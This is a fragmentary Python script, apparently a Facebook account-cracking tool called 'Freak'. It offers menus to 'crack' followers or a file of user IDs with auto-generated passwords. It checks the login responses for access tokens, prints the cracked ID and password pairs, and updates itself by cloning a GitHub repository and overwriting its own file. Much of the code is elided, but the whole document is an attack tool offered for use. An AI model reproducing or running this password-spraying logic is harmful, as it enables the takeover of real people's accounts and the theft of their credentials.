...
def main():h
	...
	print("\033[96;1m  [J] JOIN MR. FREAK GROUP \033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("git clone https://github.com/Freak-virus/Freak")

			os.system("rm -rf Freak.py")

			os.system("cp -f Freak/Freak.py \\.")

			os.system("rm -rf Freak")
...
def menu():
    ...
    print("\033[94;1m  [1] CRACK WITH AUTO PASS")

    print("\033[95;1m  [2] CRACK WITH DIGIT PASS")

    print('\033[99;1m  [0] BACK')
...
def crack1():
	...
	print("\033[98;1m  [2] CRACK FOLLOWERS")

	print("\033[97;1m  [3] CRACK FILE")
...
def crack_select1():
	...
	print("\033[97;1m  TOTAL IDS : \033[92;1m"+str(len(id)))

	print("\033[96;1m  CLONING HAS BEEN STARTED\x1b[0m")

	print("\033[95;1m  WAIT BRO \033[92;1m◐\033[91;1m◑\x1b[0m")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				print(" \033[1;32m[OOH-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					print(" \033[1;33m[OOH-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[OOH-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							print(" \033[1;33m[OOH-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[OOH-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									print(" \033[1;33m[OOH-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[OOH-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[OOH-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[OOH-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													print(" \033[1;33m[OOH-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[OOH-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[OOH-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[OOH-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	print(" \033[1;33m[OOH-CP] "+uid+" | "+pass7+"\033[0;97m")
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[OOH-OK] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[OOH-CP] "+uid+" | "+pass8+"\033[0;97m")
